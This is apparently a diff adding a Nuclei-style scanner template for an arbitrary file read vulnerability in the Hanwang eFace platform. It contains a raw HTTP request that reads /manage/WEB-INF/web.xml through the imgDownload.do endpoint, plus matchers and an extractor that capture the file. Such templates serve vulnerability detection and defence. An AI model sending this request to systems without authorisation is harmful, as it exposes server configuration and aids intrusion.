@@ -1,0 +1,32 @@
+id: hanwang-file-read
+
+info:
+  name: Hanwang eFace Comprehensive Management Platform Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template exploits an arbitrary file read vulnerability in the Hanwang eFace comprehensive management platform via the imgDownload.do endpoint.
+  tags: file-read,arbitrary-file-access
+
+http:
+  - raw:
+      - |
+        GET /manage/resourceUpload/imgDownload.do?filePath=/manage/WEB-INF/web.xml&recoToken=SGUsqvF7cVS HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<web-app" # Detects the XML content indicative of a web.xml file.
+          - "<servlet>"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "<web-app.*</web-app>" # Extracts the web.xml file content.
